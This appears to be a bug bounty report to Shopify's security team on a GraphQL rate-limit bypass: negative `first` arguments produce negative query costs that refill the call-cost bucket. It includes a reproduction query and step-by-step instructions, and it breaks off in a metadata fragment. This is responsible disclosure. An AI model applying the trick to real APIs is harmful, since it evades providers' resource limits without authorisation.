security team,\n\nWhile looking into the graphql app I noticed an interesting implementation where each app has a bucket of query cost they are allowed to used in a given time with a certain refresh rate associated with it.\n\nThe details can be found at https://help.shopify.com/en/api/graphql-admin-api/call-limit\n\nNow Using the app I noticed by calling something like `first(-100)` will give you a negative cost \n{F408086}\n\nThis doesn't give you more than the maximum amount however you can deplete your resources down to 50 and then use a negative query to fill it back up to a maximum of 1000 to keep querying indefinitely.\n\nIn order to reproduce I used a high cost query like:\n```\n{\n  appInstallations(first: 10) {\n    edges {\n      node {\n        id\n        uninstallUrl\n        accessScopes {\n          description\n          handle\n        }\n        accessScopes {\n          description\n          handle\n        }\n        accessScopes {\n          description\n          handle\n        }\n        accessScopes {\n          description\n          handle\n        }\n        launchUrl\n        app {\n          pricingDetailsSummary\n          apiKey\n          banner {\n            altText\n            metafields(first: 2) {\n              edges {\n                node {\n                  description\n                  value\n                  namespace\n                  id\n                }\n              }\n            }\n          }\n          handle\n          features\n          pricingDetails\n          published\n          feedback {\n            messages {\n              message\n            }\n            link {\n              url\n            }\n          }\n        }\n      }\n    }\n  }\n}\n```\nAnd hit sent 10-15 times at https://emitrani.myshopify.com/admin/apps/shopify-graphiql-app\n\nAfter that change one of the `first` parameters into `(first: -1000)` and try a regular query again and you will see it succeeds as the pool will be back up to full.\n\n## Impact\n\nIt is possible to leverage the logic error to bypass GraphQL rate limiting.\n\nBest,\nEray","weakness":{"id":65,"name":"Business Logic
